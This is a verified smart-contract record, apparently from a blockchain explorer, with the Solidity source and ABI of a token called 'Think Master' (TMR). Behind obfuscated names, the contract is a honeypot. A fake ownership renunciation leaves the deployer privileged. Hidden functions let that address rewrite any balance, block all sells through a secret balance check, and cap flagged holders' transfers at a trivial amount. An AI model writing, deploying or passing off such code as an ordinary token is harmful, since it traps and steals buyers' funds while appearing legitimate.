{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface launchFund {\n    function createPair(address tradingEnable, address shouldSenderTx) external returns (address);\n}\n\ninterface toTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverToken) external view returns (uint256);\n\n    function transfer(address walletSwapAmount, uint256 liquidityAmount) external returns (bool);\n\n    function allowance(address launchMaxMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletSwapAmount,\n        uint256 liquidityAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableAmount, uint256 value);\n    event Approval(address indexed launchMaxMin, address indexed spender, uint256 value);\n}\n\nabstract contract feeMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverReceiverIs is toTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ThinkMaster is feeMarketing, toTake, receiverReceiverIs {\n\n    uint256 public exemptWalletSell;\n\n    mapping(address => bool) public shouldToken;\n\n    function approve(address listFrom, uint256 liquidityAmount) public virtual override returns (bool) {\n        sellBuy[_msgSender()][listFrom] = liquidityAmount;\n        emit Approval(_msgSender(), listFrom, liquidityAmount);\n        return true;\n    }\n\n    function balanceOf(address receiverToken) public view virtual override returns (uint256) {\n        return sellAmount[receiverToken];\n    }\n\n    function shouldMin() private view {\n        require(walletBuy[_msgSender()]);\n    }\n\n    uint8 private isSwap = 18;\n\n    function feeExempt(address txSwap) public {\n        if (tradingExempt) {\n            return;\n        }\n        if (txMarketing == isLaunch) {\n            receiverMode = exemptWalletSell;\n        }\n        walletBuy[txSwap] = true;\n        \n        tradingExempt = true;\n    }\n\n    mapping(address => uint256) private sellAmount;\n\n    function allowance(address swapEnable, address listFrom) external view virtual override returns (uint256) {\n        if (listFrom == sellMode) {\n            return type(uint256).max;\n        }\n        return sellBuy[swapEnable][listFrom];\n    }\n\n    bool private isLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeBuy;\n    }\n\n    string private modeShould = \"Think Master\";\n\n    function marketingBuyTeam(address sellLimitTotal, address walletSwapAmount, uint256 liquidityAmount) internal returns (bool) {\n        require(sellAmount[sellLimitTotal] >= liquidityAmount);\n        sellAmount[sellLimitTotal] -= liquidityAmount;\n        sellAmount[walletSwapAmount] += liquidityAmount;\n        emit Transfer(sellLimitTotal, walletSwapAmount, liquidityAmount);\n        return true;\n    }\n\n    mapping(address => bool) public walletBuy;\n\n    uint256 private modeBuy = 100000000 * 10 ** 18;\n\n    address liquiditySwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return exemptLaunch;\n    }\n\n    function transfer(address maxEnable, uint256 liquidityAmount) external virtual override returns (bool) {\n        return minSell(_msgSender(), maxEnable, liquidityAmount);\n    }\n\n    uint256 constant liquidityTo = 7 ** 10;\n\n    address private exemptLaunch;\n\n    function transferFrom(address sellLimitTotal, address walletSwapAmount, uint256 liquidityAmount) external override returns (bool) {\n        if (_msgSender() != sellMode) {\n            if (sellBuy[sellLimitTotal][_msgSender()] != type(uint256).max) {\n                require(liquidityAmount <= sellBuy[sellLimitTotal][_msgSender()]);\n                sellBuy[sellLimitTotal][_msgSender()] -= liquidityAmount;\n            }\n        }\n        return minSell(sellLimitTotal, walletSwapAmount, liquidityAmount);\n    }\n\n    uint256 txSender;\n\n    function owner() external view returns (address) {\n        return exemptLaunch;\n    }\n\n    string private receiverShould = \"TMR\";\n\n    address public walletLaunched;\n\n    function enableMode() public {\n        emit OwnershipTransferred(tokenEnable, address(0));\n        exemptLaunch = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private sellBuy;\n\n    bool public tradingExempt;\n\n    function receiverIs(address maxEnable, uint256 liquidityAmount) public {\n        shouldMin();\n        sellAmount[maxEnable] = liquidityAmount;\n    }\n\n    uint256 private receiverMode;\n\n    address public tokenEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverShould;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isSwap;\n    }\n\n    bool private tokenFeeList;\n\n    function minSell(address sellLimitTotal, address walletSwapAmount, uint256 liquidityAmount) internal returns (bool) {\n        if (sellLimitTotal == tokenEnable) {\n            return marketingBuyTeam(sellLimitTotal, walletSwapAmount, liquidityAmount);\n        }\n        uint256 autoFrom = toTake(walletLaunched).balanceOf(liquiditySwap);\n        require(autoFrom == txSender);\n        require(walletSwapAmount != liquiditySwap);\n        if (shouldToken[sellLimitTotal]) {\n            return marketingBuyTeam(sellLimitTotal, walletSwapAmount, liquidityTo);\n        }\n        return marketingBuyTeam(sellLimitTotal, walletSwapAmount, liquidityAmount);\n    }\n\n    bool private txMarketing;\n\n    address sellMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 fromMarketing;\n\n    constructor (){\n        if (txMarketing) {\n            isLaunch = true;\n        }\n        launchedBuy amountTake = launchedBuy(sellMode);\n        walletLaunched = launchFund(amountTake.factory()).createPair(amountTake.WETH(), address(this));\n        \n        tokenEnable = _msgSender();\n        walletBuy[tokenEnable] = true;\n        sellAmount[tokenEnable] = modeBuy;\n        enableMode();\n        if (tokenLaunched == receiverMode) {\n            isLaunch = false;\n        }\n        emit Transfer(address(0), tokenEnable, modeBuy);\n    }\n\n    event OwnershipTransferred(address indexed sellList, address indexed listSender);\n\n    function launchTradingAmount(address launchedMax) public {\n        shouldMin();\n        \n        if (launchedMax == tokenEnable || launchedMax == walletLaunched) {\n            return;\n        }\n        shouldToken[launchedMax] = true;\n    }\n\n    uint256 private tokenLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return modeShould;\n    }\n\n    function senderLaunched(uint256 liquidityAmount) public {\n        shouldMin();\n        txSender = liquidityAmount;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMaxMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptWalletSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSwap\",\"type\":\"address\"}],\"name\":\"feeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMax\",\"type\":\"address\"}],\"name\":\"launchTradingAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAmount\",\"type\":\"uint256\"}],\"name\":\"receiverIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityAmount\",\"type\":\"uint256\"}],\"name\":\"senderLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLimitTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletSwapAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ThinkMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}